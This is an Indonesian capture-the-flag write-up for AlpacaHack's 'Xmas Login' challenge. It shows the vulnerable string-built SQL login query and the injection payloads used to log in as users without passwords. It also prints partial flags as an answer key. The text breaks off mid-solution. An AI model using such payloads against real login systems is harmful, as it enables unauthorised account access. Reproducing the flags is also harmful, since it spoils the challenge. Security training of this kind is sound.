Xmas Login - AlpacaHack
https://alpacahack.com/challenges/xmas-login

Kita di beri source dan kita bisa lihat di sini 
```javascript
query = (

f"SELECT * FROM users WHERE username='{username}' AND password='{password}';"

)
```
nah ini kan sqli banget kita bisa untuk bikin payload 
user: `' OR 1=1 --`
pw: `bebas`

nah nanti kita bisa bypass dapat masuk nah tapi masalah nya  
```javascript 
if user[0] == "alpaca":

return f"Hello, alpaca! Here is your flag: {FLAG_1}"

elif user[0] == "reindeer":

return f"Hello, reindeer! Here is your flag: {FLAG_2}"

elif user[0] == "santa_claus_admin":

return f"Hello, santa_claus_admin! Here is your flag: {FLAG_3}"

else:

return f"Hello, {user[0]}!"
```

jadi karena flag nya di pecah pecah kita harus buat 3 payload berbeda agar dapat username yang pass dan bypass password nya

yang pertama 
user: `' OR 1=1 --`
pw: `bebas`

ini akan dapat flag 
![[Pasted image 20260715134902.png]]

```
Hello, alpaca! Here is your flag: Alpaca{M3rry_Xmas!_Th1s_
```

Nah lalu kita bisa bikin yang kedua
username: `reindeer'--`
pw: `bebas`
![[Pasted image 20260715135047.png]]

```
Hello, reindeer! Here is your flag: is_4_g1ft_fr0m_santa!_an
```

nah yang terakhir karena limit username nya gak cukup kita bisa

username: `bebas`
pw: `'`